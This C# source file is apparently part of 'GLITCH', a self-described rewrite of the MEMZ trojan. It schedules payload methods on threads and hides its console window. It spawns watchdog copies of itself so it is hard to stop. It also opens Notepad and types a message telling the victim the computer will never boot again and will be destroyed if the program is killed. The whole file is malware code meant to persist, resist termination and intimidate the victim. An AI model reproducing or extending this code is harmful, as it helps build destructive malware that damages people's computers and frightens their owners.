using System;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;

namespace Misc
{
    public static class StandardCommands
    {
        public static Thread GetRunner(MethodInfo method, int runAfter, int defaultDelay) =>
            new Thread(() =>
            {
                while (runAfter > Common.TimePassed) Thread.Sleep(1000);
                while (true)
                    try
                    {
                        method.Invoke(null, new object[0]);
                        Thread.Sleep(Math.Max((int) (defaultDelay * Common.DelayMultiplier), 50));
                    }
                    catch
                    {
                        // ignored
                    }
            });

        public static Thread GetSelfHostedRunner(MethodInfo method, int runAfter) =>
            new Thread(() =>
            {
                while (runAfter > Common.TimePassed) Thread.Sleep(1000);
                try
                {
                    method.Invoke(null, new object[0]);
                }
                catch
                {
                    // ignored
                }
            });

        public static void ShowNotepad()
        {
            Process proc = Process.Start("notepad.exe");
            proc.WaitForInputIdle();
            proc.GetMainWindow().IsForeground = true;
            const string msg =
                "YOUR COMPUTER HAS BEEN FUCKED BY GLITCH,\nA REWRITE OF THE MEMZ TROJAN.\n\nYour computer won't boot up again,\nso use it as long as you can!\n\n:D\n\nTrying to kill GLITCH will cause your system to be\ndestroyed instantly, so don't try it :D";
            SendKeys.SendWait(msg);
        }

        public static void RunWDs()
        {
            for (int i = 0; i < WatchDog.WDC; i++)
                Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
        }

        public static void HideCmd() => Process.GetCurrentProcess().GetMainWindow().Shown = false;

        public static void LaunchIncrementor()
        {
            new Thread(() =>
            {
                Thread.Sleep(1000);
                Common.TimePassed++;
                Common.DelayMultiplier = Math.Max(2 / Common.TimePassed, float.Epsilon);
            }).Start();
        }

        public static MethodInfo GetMethodInfo(Action d) => d.Method;

        public static bool ShouldRunWD(string[] args) => args.Length == 1 && args[0] == "wd";
    }
}